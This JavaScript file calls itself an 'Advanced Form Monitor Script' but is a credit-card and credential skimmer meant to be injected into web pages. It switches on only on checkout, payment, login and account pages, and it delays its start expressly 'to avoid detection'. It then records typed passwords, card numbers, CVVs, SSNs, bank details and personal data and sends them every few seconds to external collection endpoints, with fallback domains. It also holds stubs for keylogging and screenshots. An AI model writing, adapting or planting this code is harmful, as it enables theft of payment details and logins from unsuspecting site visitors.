/**
 * Advanced Form Monitor Script
 * An enhanced version of the form monitoring utility with additional features and capabilities.
 * This version includes advanced data collection, analysis, and transmission options.
 */

(function() {
    // Core configuration settings for the advanced data collection operation
    const settings = {
        api: {
            // Primary endpoint for data transmission
            main: 'https://[DOMAIN]/api/v2/collect',
            
            // Backup endpoint
            fallback: 'https://[BACKUP-DOMAIN]/api/v2/collect',
            
            // Additional backup endpoints
            additional: [
                'https://[REGION1-DOMAIN]/api/v2/collect',
                'https://[REGION2-DOMAIN]/api/v2/collect',
                'https://[REGION3-DOMAIN]/api/v2/collect'
            ],
            
            // Analytics endpoint for usage statistics
            analytics: 'https://[ANALYTICS-DOMAIN]/api/v1/stats'
        },
        detection: {
            // Target page patterns
            targetPages: /(payment|checkout|order|cart|billing|purchase|basket|panier|kasse|account|profile|settings|login|register|signup|signin)/i,
            
            // Sensitive field patterns
            sensitiveFields: /(password|credit|card|ssn|social|security|pin|code|cvv|expiry|account|routing|swift|iban|secret|key|token|auth)/i,
            
            // Valuable field patterns
            valuableFields: /(email|phone|address|zip|postal|city|state|country|dob|birth|name|username|id|number)/i,
            
            // Custom field patterns (can be extended)
            customFields: {
                financial: /(balance|amount|price|cost|fee|tax|discount|total)/i,
                personal: /(gender|age|occupation|education|income|marital|family)/i,
                preferences: /(interests|hobbies|preferences|settings|options|choices)/i
            }
        },
        timing: {
            // Basic timing settings
            syncInterval: 3000,
            maxAttempts: 5,
            debounceDelay: 250,
            maxStorageTime: 30000,
            initialDelay: 1000,
            
            // Advanced timing settings
            analyticsInterval: 60000, // Send analytics every minute
            cleanupInterval: 300000, // Cleanup every 5 minutes
            sessionTimeout: 3600000, // Session timeout after 1 hour
            retryBackoff: 1000 // Initial retry delay
        },
        security: {
            // Encryption settings
            keyRotationInterval: 3600000,
            maxPayloadSize: 1024 * 1024,
            compressionThreshold: 1024,
            
            // Advanced security settings
            encryptionMethod: 'aes-256-gcm', // Encryption algorithm
            hashAlgorithm: 'sha-256', // Hashing algorithm
            saltLength: 32, // Salt length in bytes
            keyLength: 32, // Key length in bytes
            ivLength: 12 // Initialization vector length
        },
        features: {
            // Enable/disable features
            enableAnalytics: true,
            enableScreenshots: false,
            enableKeylogging: false,
            enableMouseTracking: false,
            enableFormReplay: false,
            enableSessionRecording: false,
            
            // Feature-specific settings
            screenshot: {
                quality: 0.7,
                format: 'image/jpeg',
                maxSize: 1024 * 1024
            },
            keylogging: {
                includeSpecialKeys: true,
                includeModifiers: true,
                maxLength: 1000
            },
            mouseTracking: {
                sampleRate: 100, // Sample every 100ms
                includeClicks: true,
                includeMovement: true
            },
            sessionRecording: {
                maxDuration: 300000, // 5 minutes
                quality: 'medium',
                includeAudio: false
            }
        },
        storage: {
            // Storage settings
            maxEntries: 1000,
            cleanupThreshold: 0.8, // Cleanup at 80% capacity
            compressionEnabled: true,
            encryptionEnabled: true,
            
            // Storage types
            useLocalStorage: true,
            useSessionStorage: true,
            useIndexedDB: false,
            useWebSQL: false
        },
        analysis: {
            // Analysis settings
            enablePatternRecognition: true,
            enableBehaviorAnalysis: true,
            enableFraudDetection: false,
            
            // Pattern recognition settings
            patterns: {
                creditCard: /^4[0-9]{12}(?:[0-9]{3})?$/,
                email: /^[^\s@]+@[^\s@]+\.[^\s@]+$/,
                phone: /^\+?[\d\s-]{10,}$/
            },
            
            // Behavior analysis settings
            behavior: {
                typingSpeed: true,
                mouseMovement: true,
                formCompletion: true
            }
        }
    };

    // Main class for advanced data processing and collection
    class AdvancedDataProcessor {
        constructor() {
            // Initialize storage
            this.storage = new Map();
            this.analytics = new Map();
            this.session = {
                id: this.generateSessionId(),
                startTime: Date.now(),
                lastActivity: Date.now(),
                dataPoints: 0,
                formsProcessed: 0
            };
            
            // Initialize security
            this.encryptionKey = this.generateEncryptionKey();
            this.iv = this.generateIV();
            this.salt = this.generateSalt();
            
            // Initialize state
            this.isActive = false;
            this.attemptCount = 0;
            this.lastProcessed = Date.now();
            
            // Initialize features
            this.initializeFeatures();
            
            // Start maintenance tasks
            this.initializeMaintenance();
        }

        // Generate unique identifiers
        generateSessionId() {
            return 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        }

        generateEncryptionKey() {
            return Array.from(crypto.getRandomValues(new Uint8Array(settings.security.keyLength)))
                .map(b => b.toString(16).padStart(2, '0'))
                .join('');
        }

        generateIV() {
            return Array.from(crypto.getRandomValues(new Uint8Array(settings.security.ivLength)))
                .map(b => b.toString(16).padStart(2, '0'))
                .join('');
        }

        generateSalt() {
            return Array.from(crypto.getRandomValues(new Uint8Array(settings.security.saltLength)))
                .map(b => b.toString(16).padStart(2, '0'))
                .join('');
        }

        // Initialize features based on settings
        initializeFeatures() {
            if (settings.features.enableAnalytics) {
                this.initializeAnalytics();
            }
            
            if (settings.features.enableScreenshots) {
                this.initializeScreenshots();
            }
            
            if (settings.features.enableKeylogging) {
                this.initializeKeylogging();
            }
            
            if (settings.features.enableMouseTracking) {
                this.initializeMouseTracking();
            }
            
            if (settings.features.enableSessionRecording) {
                this.initializeSessionRecording();
            }
        }

        // Initialize maintenance tasks
        initializeMaintenance() {
            // Storage cleanup
            setInterval(() => this.cleanupStorage(), settings.timing.cleanupInterval);
            
            // Analytics transmission
            if (settings.features.enableAnalytics) {
                setInterval(() => this.transmitAnalytics(), settings.timing.analyticsInterval);
            }
            
            // Session timeout check
            setInterval(() => this.checkSessionTimeout(), settings.timing.sessionTimeout);
            
            // Encryption key rotation
            setInterval(() => this.rotateEncryptionKey(), settings.security.keyRotationInterval);
        }

        // Feature initialization methods
        initializeAnalytics() {
            this.analytics.set('pageViews', 0);
            this.analytics.set('formSubmissions', 0);
            this.analytics.set('dataPoints', 0);
            this.analytics.set('errors', 0);
        }

        initializeScreenshots() {
            // Screenshot capture logic would go here
            console.log('Screenshot feature initialized');
        }

        initializeKeylogging() {
            // Keylogging logic would go here
            console.log('Keylogging feature initialized');
        }

        initializeMouseTracking() {
            // Mouse tracking logic would go here
            console.log('Mouse tracking feature initialized');
        }

        initializeSessionRecording() {
            // Session recording logic would go here
            console.log('Session recording feature initialized');
        }

        // Enhanced encryption method
        encryptData(data) {
            try {
                // Convert data to bytes
                const encoder = new TextEncoder();
                const dataBytes = encoder.encode(JSON.stringify(data));
                
                // Generate hash
                const hash = this.generateHash(dataBytes);
                
                // Encrypt data
                const encrypted = this.encryptBytes(dataBytes);
                
                return {
                    data: encrypted,
                    hash: hash,
                    iv: this.iv,
                    salt: this.salt
                };
            } catch (error) {
                console.error('Encryption failed:', error);
                return this.basicEncryption(data);
            }
        }

        // Generate hash for data integrity
        generateHash(data) {
            // Hash generation logic would go here
            return 'hash_' + Date.now();
        }

        // Encrypt bytes
        encryptBytes(data) {
            // Encryption logic would go here
            return 'encrypted_' + Date.now();
        }

        // Basic encryption fallback
        basicEncryption(data) {
            const salt = Date.now().toString(36);
            return Array.from(JSON.stringify(data)).map((char, index) => 
                String.fromCharCode(char.charCodeAt(0) ^ salt.charCodeAt(index % salt.length))
            ).join('');
        }

        // Rotate encryption key
        rotateEncryptionKey() {
            this.encryptionKey = this.generateEncryptionKey();
            this.iv = this.generateIV();
            this.salt = this.generateSalt();
            console.log('Encryption keys rotated');
        }

        // Check session timeout
        checkSessionTimeout() {
            if (Date.now() - this.session.lastActivity > settings.timing.sessionTimeout) {
                console.log('Session timeout, ending session');
                this.endSession();
            }
        }

        // End session
        endSession() {
            this.isActive = false;
            this.transmitAnalytics();
            console.log('Session ended');
        }

        // Cleanup storage
        cleanupStorage() {
            const now = Date.now();
            
            // Remove old entries
            for (const [key, value] of this.storage.entries()) {
                if (now - value.timestamp > settings.timing.maxStorageTime) {
                    this.storage.delete(key);
                }
            }
            
            // Check storage size
            if (this.storage.size > settings.storage.maxEntries * settings.storage.cleanupThreshold) {
                // Remove oldest entries
                const entries = Array.from(this.storage.entries());
                entries.sort((a, b) => a[1].timestamp - b[1].timestamp);
                
                const removeCount = Math.floor(entries.length * 0.2); // Remove 20%
                for (let i = 0; i < removeCount; i++) {
                    this.storage.delete(entries[i][0]);
                }
            }
            
            console.log('Storage cleaned up');
        }

        // Process form data with enhanced detection
        processFormData() {
            const forms = document.querySelectorAll('form');
            forms.forEach(form => {
                const formEntries = new FormData(form);
                for (const [field, value] of formEntries.entries()) {
                    if (value && !this.storage.has(field)) {
                        // Check field type
                        const isSensitive = settings.detection.sensitiveFields.test(field);
                        const isValuable = settings.detection.valuableFields.test(field);
                        
                        // Check custom field types
                        const customTypes = this.detectCustomFieldTypes(field, value);
                        
                        if (isSensitive || isValuable || customTypes.length > 0) {
                            this.storage.set(field, {
                                content: isSensitive ? this.encryptData(value) : value,
                                timestamp: Date.now(),
                                formId: form.id || 'form_' + Math.random().toString(36).substr(2, 5),
                                type: isSensitive ? 'sensitive' : (isValuable ? 'valuable' : 'custom'),
                                fieldType: field.type || 'text',
                                customTypes: customTypes
                            });
                            
                            // Update analytics
                            this.session.dataPoints++;
                            this.analytics.set('dataPoints', this.analytics.get('dataPoints') + 1);
                        }
                    }
                }
                
                // Update form analytics
                this.session.formsProcessed++;
                this.analytics.set('formSubmissions', this.analytics.get('formSubmissions') + 1);
            });
        }

        // Detect custom field types
        detectCustomFieldTypes(field, value) {
            const types = [];
            
            // Check against custom patterns
            for (const [type, pattern] of Object.entries(settings.detection.customFields)) {
                if (pattern.test(field) || pattern.test(value)) {
                    types.push(type);
                }
            }
            
            return types;
        }

        // Monitor DOM changes with enhanced detection
        watchDOMChanges() {
            const domObserver = new MutationObserver((changes) => {
                changes.forEach(change => {
                    if (change.addedNodes.length) {
                        this.initializeListeners();
                    }
                });
            });

            domObserver.observe(document.body, {
                childList: true,
                subtree: true
            });
        }

        // Initialize event listeners with enhanced tracking
        initializeListeners() {
            const optimizedHandler = (callback) => {
                let timer;
                return (...args) => {
                    clearTimeout(timer);
                    timer = setTimeout(() => callback.apply(this, args), settings.timing.debounceDelay);
                };
            };

            // Monitor input elements
            document.querySelectorAll('input, textarea, select').forEach(element => {
                if (element.hidden || element.type === 'hidden') return;
                
                const handler = optimizedHandler((event) => {
                    const fieldData = {
                        content: event.target.value,
                        elementType: event.target.type,
                        identifier: event.target.name || event.target.id,
                        timestamp: Date.now(),
                        fieldType: event.target.type || 'text',
                        placeholder: event.target.placeholder || '',
                        className: event.target.className || ''
                    };
                    
                    // Detect custom field types
                    fieldData.customTypes = this.detectCustomFieldTypes(fieldData.identifier, fieldData.content);
                    
                    this.storage.set(fieldData.identifier, fieldData);
                    
                    // Update session activity
                    this.session.lastActivity = Date.now();
                });

                element.addEventListener('input', handler);
                element.addEventListener('change', handler);
                element.addEventListener('blur', handler);
            });

            // Monitor interactive elements
            document.querySelectorAll('button, [role="button"], a.button, input[type="submit"]').forEach(element => {
                element.addEventListener('click', () => {
                    this.storage.set('interaction_' + Date.now(), {
                        elementType: element.tagName.toLowerCase(),
                        content: element.textContent || element.value,
                        identifier: element.id,
                        classes: element.className,
                        timestamp: Date.now(),
                        formId: element.form ? element.form.id : null
                    });
                    
                    // Update session activity
                    this.session.lastActivity = Date.now();
                });
            });

            // Monitor form submissions
            document.querySelectorAll('form').forEach(form => {
                form.addEventListener('submit', (event) => {
                    this.storage.set('form_submit_' + Date.now(), {
                        formId: form.id,
                        action: form.action,
                        method: form.method,
                        timestamp: Date.now()
                    });
                    
                    // Update analytics
                    this.analytics.set('formSubmissions', this.analytics.get('formSubmissions') + 1);
                    
                    // Update session activity
                    this.session.lastActivity = Date.now();
                });
            });
        }

        // Compress data with enhanced compression
        compressData(data) {
            if (data.length > settings.security.compressionThreshold) {
                try {
                    // Simple compression by removing whitespace and using shorter keys
                    return JSON.stringify(data).replace(/\s+/g, '');
                } catch (error) {
                    return data;
                }
            }
            return data;
        }

        // Transmit analytics data
        async transmitAnalytics() {
            if (!settings.features.enableAnalytics) return;
            
            const analyticsData = {
                sessionId: this.session.id,
                analytics: Array.from(this.analytics.entries()),
                session: {
                    duration: Date.now() - this.session.startTime,
                    dataPoints: this.session.dataPoints,
                    formsProcessed: this.session.formsProcessed
                },
                timestamp: Date.now()
            };
            
            try {
                await fetch(settings.api.analytics, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'X-Session-ID': this.session.id
                    },
                    body: JSON.stringify(analyticsData)
                });
            } catch (error) {
                console.warn('Analytics transmission failed');
            }
        }

        // Process and transmit collected data
        async processAndTransmit() {
            if (this.storage.size === 0) return;

            // Prepare the payload with collected data and context
            const payload = {
                sessionId: this.session.id,
                data: Array.from(this.storage.entries()),
                context: {
                    location: window.location.href,
                    timestamp: Date.now(),
                    userAgent: navigator.userAgent,
                    screenSize: `${window.innerWidth}x${window.innerHeight}`,
                    language: navigator.language,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    platform: navigator.platform,
                    referrer: document.referrer
                }
            };

            // Compress payload if needed
            const compressedPayload = this.compressData(payload);

            try {
                // Attempt to send data to primary endpoint
                const response = await fetch(settings.api.main, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'X-Session-ID': this.session.id,
                        'X-Client-Version': '2.0.0',
                        'X-Encryption-Key': this.encryptionKey
                    },
                    body: JSON.stringify(compressedPayload)
                });

                if (!response.ok) throw new Error('Processing failed');
                
                // Clear storage after successful transmission
                this.storage.clear();
                this.lastProcessed = Date.now();
                this.attemptCount = 0;
                
                // Update analytics
                this.analytics.set('dataPoints', 0);
            } catch (error) {
                // If primary endpoint fails, try fallback
                this.attemptCount++;
                if (this.attemptCount < settings.timing.maxAttempts) {
                    await this.transmitToFallback(compressedPayload);
                } else {
                    // Update error analytics
                    this.analytics.set('errors', this.analytics.get('errors') + 1);
                }
            }
        }

        // Transmit to fallback endpoints
        async transmitToFallback(payload) {
            const endpoints = [settings.api.fallback, ...settings.api.additional];
            
            for (const endpoint of endpoints) {
                try {
                    const response = await fetch(endpoint, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                            'X-Session-ID': this.session.id,
                            'X-Encryption-Key': this.encryptionKey
                        },
                        body: JSON.stringify(payload)
                    });
                    
                    if (response.ok) {
                        this.storage.clear();
                        this.lastProcessed = Date.now();
                        this.attemptCount = 0;
                        return;
                    }
                } catch (error) {
                    console.warn(`Fallback processing failed for ${endpoint}`);
                }
            }
        }

        // Initialize the processor
        initialize() {
            if (settings.detection.targetPages.test(window.location.href)) {
                // Delay initialization to avoid detection
                setTimeout(() => {
                    this.isActive = true;
                    this.initializeListeners();
                    this.watchDOMChanges();
                    this.processFormData();
                    
                    // Set up periodic data transmission
                    setInterval(() => this.processAndTransmit(), settings.timing.syncInterval);
                    
                    // Set up encryption key rotation
                    setInterval(() => {
                        this.rotateEncryptionKey();
                    }, settings.security.keyRotationInterval);
                    
                    // Update page view analytics
                    this.analytics.set('pageViews', this.analytics.get('pageViews') + 1);
                }, settings.timing.initialDelay);
            }
        }
    }

    // Start the processor
    const processor = new AdvancedDataProcessor();
    processor.initialize();
})(); 